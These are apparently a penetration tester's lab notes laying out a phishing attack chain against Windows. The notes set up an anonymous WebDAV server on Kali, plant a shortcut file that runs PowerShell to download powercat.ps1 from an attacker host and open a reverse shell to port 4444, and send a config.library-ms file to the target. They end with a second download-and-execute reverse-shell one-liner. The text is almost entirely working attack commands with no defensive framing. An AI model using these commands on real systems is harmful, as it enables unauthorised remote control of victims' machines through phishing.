
mkdir /home/kali/beyond/webdav

/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

in lnkfile :
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.250:8000/powercat.ps1'); powercat -c 192.168.45.250 -p 4444 -e powershell"
```


put lnkfile in the webdav folder

send config.library-ms to reciever

host powercat.ps1 on python server

powershell.exe -c iwr http://192.168.45.248:8000/powercat.ps1 -outfile c:\windows\temp\powercat.ps1; powercat -c 192.168.45.250 -p 4444 -e powershell"